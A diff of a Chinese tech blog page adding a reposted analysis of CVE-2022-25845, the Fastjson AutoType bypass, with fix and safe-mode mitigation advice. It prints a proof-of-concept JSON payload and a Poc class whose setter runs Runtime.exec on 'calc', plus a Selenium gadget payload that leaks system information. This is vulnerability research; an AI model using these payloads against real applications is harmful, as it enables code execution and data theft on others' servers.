@@ -14,7 +14,7 @@
     <meta name="description" content="Open your eyes to see the light in life">
 <meta property="og:type" content="website">
 <meta property="og:title" content="氕氘氚">
-<meta property="og:url" content="http://example.com/page/12/index.html">
+<meta property="og:url" content="https://szczecin.github.io/page/12/index.html">
 <meta property="og:site_name" content="氕氘氚">
 <meta property="og:description" content="Open your eyes to see the light in life">
 <meta property="og:locale">
@@ -77,6 +77,249 @@
 
 
 <section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
+                CVE-2022-25845 – Fastjson
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-25845-fastjson-auto-type-bypass-rce漏洞分析">CVE-2022-25845 – Fastjson “Auto Type Bypass” RCE漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d4702da8b93e?u_atoken=e8be5a2e-d2f2-40e8-9032-eb762ac70e4d&u_asession=016gAHNAGW5kwEmr9SHcziNNztkuT3HPV9Qi1BUpHrLJq9hEVlxH_k1w9FiGt4iz1TX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_nesHWq-uvzShryNdruwb_Ppcarp92QKzyJKyYjREPlmBkFo3NEHBv0PZUm6pbxQU&u_asig=0571xFqT6ytNlYS2FmxKjAUaC7IIZzHH_wNoBkl0fuXB7L7i_BKRMiYdR7WkEyOH04jON-Y6ZkqCQaLBYWgAvEfdDsRAMInmkstRXd3gA_02JitfEM0sXqs1ygakF_Gssvi8K917w5adBQOQPWp0fT6NXrc-haXIlf4ev16Nwyo_H9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJze09tESGin2xLknH8nQ1NfDH10X8edffiTaObeVvRyl4WPRPQyB_SKrj-61LB_f61u3h9VXwMyh6PgyDIVSG1W88Y2fYLRHbT4ia04fxhHA1ybLonYZfH1eNUN_6rAKYnOe2A-SmkXiAo5UbaV32iFMBBLacmUFwtytO_4ZvRIY1mWspDxyAEEo4kbsryBKb9Q&u_aref=ErhmyQTxFTESTC8Ph/fkOki3fC0=">vayci</a></p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>几周前， Fastjson 发布了一个新版本 (1.2.83) ，其中包含一项安全漏洞修复。据称攻击者可以利用此漏洞在远程机器上执行代码。根据发布的多篇文章，攻击者通过漏洞可以绕过Fastjson中的“AutoTypeCheck”机制，完成远程代码执行。</p>
+<p>这个 Fastjson 漏洞最近才收到一个 CVE 漏洞标识符 – CVE-2022-25845，以及高达8.1的CVSS漏洞评分。尽管如此，这个漏洞仍扑朔迷离。尽管这是被宣称为在无处不在的组件中存在的一个高危RCE漏洞（将近5000个Maven项目都存在Fastjson依赖！），却几乎没有任何关于它的公开技术细节。到底是哪里存在漏洞，又是在什么条件下容易被攻击？</p>
+<p>在本篇文章中，我们深入研究了这个Fastjson漏洞的严重性，以及那些类型的Java应用程序受此影响。文末是给目前无法升级到指定Fastjson版本的开发人员的一些策略建议。</p>
+</blockquote>
+<h2><span id="哪些情况会受到cve-2022-25845漏洞的影响">哪些情况会受到CVE-2022-25845漏洞的影响？</span></h2><blockquote>
+<p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/1.png" alt="image" title="存在潜在风险的API和安全API的不完全示例"></p>
+<p>虽然看起来很宽泛，但是我们可以发现，在这些前提条件下，攻击者也只能通过这个漏洞调用特定类型的Java反序列化gadget（继承Throwable类的gadget类），这大大限制了这个漏洞的实际影响。</p>
+</blockquote>
+<h2><span id="技术深入探究">技术深入探究</span></h2><blockquote>
+<p>Fastjson 是一个 Java 库，可以将 Java 对象序列化和反序列化，实现Java对象和JSON的相互转换。</p>
+<p>和大多数 JSON 类一样，Fastjson 支持将基本 JSON 类型（数组和对象）分别序列化和反序列化为它们的 Java 等价对象——Arrays 和 Maps。</p>
+<p>然而，Fastjson也可以将用户的Java对象（POJO）序列化为JSON，或从JSON反序列化为Java对象。</p>
+<p>例如，我们定义了一个名为User的类，以下代码时将其进行序列化为JSON，然后再进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">  <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">  <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JSON.parseObject()返回一个 JSONObject 对象， 然后这个对象又转换为User类。</p>
+<p>有时候，开发人员想要更灵活的代码来接收序列化的JSON，告诉代码JSON应该被反序列化为哪种类。例如下面这种JSON形式：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdminUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GuestUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Fastjson 支持一个名为“AutoType”的功能。启用该功能后，可以为每个用户entry引入类型。开发人员只需要调用如下代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Feature.SupportAutoType);</span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">users</span> <span class="operator">=</span> (JSONArray)obj.get(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="comment">// Users[0] is of class type &quot;AdminUser&quot;</span></span><br><span class="line"><span class="comment">// Users[1] is of class type &quot;GuestUser&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但是，如果反序列化的JSON是用户可以控制的，则在启用AutoType的情况下对其进行解析可能会出现反序列化安全问题。因为攻击者可以实例化Classpath上可用的任意类，并为类的构造函数提供任意参数。这个问题已经被很多次证实确实可以利用，并且例如ysoserial之类的框架就存在这里攻击手段的风险（Java的“gadget”类）。</p>
+<p>因此，Fastjson的开发者选择默认禁用了AutoType功能，这应该能够安全地解析人员JSON数据了。但是，AutoType的机制比这复杂得多…</p>
+</blockquote>
+<h2><span id="绕过-autotype-默认禁用策略">绕过 AutoType 默认禁用策略</span></h2><blockquote>
+<p>当JSON.parseObject()被调用时，它最终会调用到 DefaultJSONParser.parseObject()，并且传入参数 object 为 JSONObject，fieldName 为 null。当这个方法遇到“@type”这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用config.checkAutoType：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终，在所有flag都是默认的情况下，代码会调用至config.checkAutoType()。在这里，我们可以看到因为被列入黑名单而无法通过AutoType 机制实例化的类列表。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expectHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">            <span class="keyword">if</span> (expectHash == <span class="number">0x90a25f5baa21529eL</span></span><br><span class="line">                    || expectHash == <span class="number">0x2d10a5801b9d6136L</span></span><br><span class="line">                    || expectHash == <span class="number">0xaf586a571e302c6bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xed007300a7b227c6L</span></span><br><span class="line">                    || expectHash == <span class="number">0x295c4605fd1eaa95L</span></span><br><span class="line">                    || expectHash == <span class="number">0x47ef269aadc650b4L</span></span><br><span class="line">                    || expectHash == <span class="number">0x6439c4dff712ae8bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xe3dd9875a2dc5283L</span></span><br><span class="line">                    || expectHash == <span class="number">0xe2a8ddba03e69e0dL</span></span><br><span class="line">                    || expectHash == <span class="number">0xd734ceb4c3e9d1daL</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这些被Ban的类是以下这些：</p>
+<ul>
+<li>java.lang.Object</li>
+<li>java.io.Serializable</li>
+<li>java.lang.Cloneable</li>
+<li>java.lang.Runnable</li>
+<li>java.lang.AutoCloseable</li>
+<li>java.io.Closeable</li>
+<li>java.lang.Iterable</li>
+<li>java.util.Collection</li>
+<li>java.lang.Readable</li>
+<li>java.util.EventListener</li>
+</ul>
+<p>你也可以在 fastjson-blacklist 查看到更多被列入黑名单的类。这个仓库维护了被列入Fastjson黑名单的类的hash值。</p>
+<p>最后，代码将尝试找到一个反序列化器deserializer，用来对这个已经被JSON序列化的类进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line"><span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">    &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">    &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 ParserConfig.getDeserializer()内部，有一个关键检查，用于验证目标类是否继承了 Throwable 类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    deserializer = <span class="keyword">new</span> <span class="title class_">ThrowableDeserializer</span>(<span class="built_in">this</span>, clazz);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ThrowableDeserializer.deserialize()会处理这种数据。如果存在“@type”，它将使用 autoTypeCheck()检查并继续正常反序列化：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因此，漏洞的核心在于 ，只要目标类继承自 Throwable 类，Fastjson便可以反序列化为任意类！</p>
+<p>在这种情况下，负责创建反序列化类的函数是 createException()，它处理了 3 种不同类型的构造函数。一个没有任何参数，一个带有异常消息的参数，一个带有异常消息和异常原因参数。在此之后，它将先尝试调用更为复杂的构造函数（causeConstructor、messageConstructor 和 defaultConstructor）：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Throwable <span class="title function_">createException</span><span class="params">(String message, Throwable cause, Class&lt;?&gt; exClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; messageConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; causeConstructor = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : exClass.getConstructors()) &#123;</span><br><span class="line">            Class&lt;?&gt;[] types = constructor.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">0</span>) &#123;</span><br><span class="line">                defaultConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">1</span> &amp;&amp; types[<span class="number">0</span>] == String.class) &#123;</span><br><span class="line">                messageConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">2</span> &amp;&amp; types[<span class="number">0</span>] == String.class &amp;&amp; types[<span class="number">1</span>] == Throwable.class) &#123;</span><br><span class="line">                causeConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (causeConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) causeConstructor.newInstance(message, cause);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (messageConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) messageConstructor.newInstance(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (defaultConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) defaultConstructor.newInstance();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>作为类实例化的一步，还会为每个相关成员变量调用一个 setter方法：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherValues != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">JavaBeanDeserializer</span> <span class="variable">exBeanDeser</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exClass == clazz) &#123;</span><br><span class="line">            exBeanDeser = <span class="built_in">this</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">exDeser</span> <span class="operator">=</span> parser.getConfig().getDeserializer(exClass);</span><br><span class="line">            <span class="keyword">if</span> (exDeser <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                exBeanDeser = (JavaBeanDeserializer) exDeser;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exBeanDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : otherValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> exBeanDeser.getFieldDeserializer(key);</span><br><span class="line">            <span class="keyword">if</span> (fieldDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> fieldDeserializer.fieldInfo;</span><br><span class="line">                <span class="keyword">if</span> (!fieldInfo.fieldClass.isInstance(value)) &#123;</span><br><span class="line">                    value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());</span><br><span class="line">                &#125;</span><br><span class="line">                fieldDeserializer.setValue(ex, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="怎么利用-cve-2022-25845-漏洞">怎么利用 CVE-2022-25845 漏洞？</span></h2><blockquote>
+<p>在了解了AutoType 机制中的上述“漏洞”之后，让我们看看一个在现实中利用这个漏洞的可行性。这个漏洞据称可以实现远程代码执行。</p>
+<p>由 YoungBear 发布的漏洞利用方案，通过传入这个JSON可以运行任意系统操作命令。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个漏洞利用方案依赖于在 Java 应用程序中定义的下面这个继承Exception的类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson.poc20220523;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> youngbear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> youngbear@aliyun.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/5/29 8:28</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> https://blog.csdn.net/next_second</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/YoungBear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> POC类：需要代码中有该类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc20220523</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当反序列化执行到上面这一段JSON时，Poc20220523这个类就创建了，并且提供name参数是通过自动调用setter方法。</p>
+<p>如代码所示，这将最终调用包含 str &#x3D; “calc”的恶意 setName() setter 函数：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这部分的实际代码内容为打开windows计算器：</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/2.png" alt="image" title="计算器弹窗"></p>
+<p>这个漏洞利用方案显然只是一个演示，因为任何正常的 Java 应用程序都不会包含类似于 Poc20220523 这样会基于外部参数运行 shell 命令的异常派生类。</p>
+<p>现在亟待解决的问题是 — 是否有大家熟知的 Java“gadget”类可以作为此漏洞的一部分被滥用？即继承自Exception或Throwable，并且存在相关的构造函数或者setter方法，可能会造成实际安全影响的Java类。</p>
+<p>目前，有一个兼容的gadget类（来自 Selenium 库）已经在被发布了。它会导致非常低影响的数据泄漏：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$x.systemInformation&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反序列化这个 JSON 最终会创建一个 HashMap，其中“y”值为有关机器的一些基本信息：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;System info: host: &#x27;&#x27;, ip: &#x27;&#x27;, os.name: &#x27;&#x27;, os.arch: &#x27;&#x27;, os.version: &#x27;&#x27;, java.version: &#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据应用程序的不同，这些信息最终可能会被存储或发送给攻击者（例如，它可能被写入可远程访问日志）。</p>
+<p>在检查了 ysoserial 等其他知名来源后，我们没有发现任何可以在实际场景中能够导致远程代码执行的gadget类。因此，想要利用这个漏洞进行实际攻击的黑客，需要对被共计的Java应用服务器进行深入研究，以找到一个加载在Classpath中的自定义的Java gadget类。这个类继承自Exception&#x2F;Throwable，并包含可用于获取权限、泄漏数据甚至运行任意代码的相关方法。</p>
+<p>总而言之，我们评估目前这个漏洞似乎并未构成很高风险的威胁。尽管存在一个潜在影响巨大（远程代码执行）的公共PoC漏洞可利用，并且攻击的条件并不是甚微（将不受信任的输入数据传递给特定易受攻击的 API）。最重要的是，必须找到一个合适的gadget类（或许由于一些不太可能的属性根本不存在）来突破特定被攻击的目标。</p>
+</blockquote>
+<h2><span id="如何完全修复-cve-2022-25845">如何完全修复 CVE-2022-25845？</span></h2><blockquote>
+<p>要完全修复 CVE-2022-25845，我们建议将 Fastjson 升级到最新版本，目前为 1.2.83。</p>
+</blockquote>
+<h2><span id="如何降低-cve-2022-25845-风险">如何降低 CVE-2022-25845 风险？</span></h2><blockquote>
+<p>启用 Fastjson 的“Safe Mode”可以减缓这个漏洞风险。</p>
+<p>可以通过执行以下任何一种操作来开启Safe Mode：</p>
+<p>1.通过代码配置 ParserConfig.getGlobalInstance().setSafeMode(true);<br>2.通过JVM启动参数配置 -Dfastjson.parser.safeMode&#x3D;true<br>3.通过Fastjson的配置文件配置项 fastjson.parser.safeMode&#x3D;true</p>
+</blockquote>
+
+
+        
+
+        
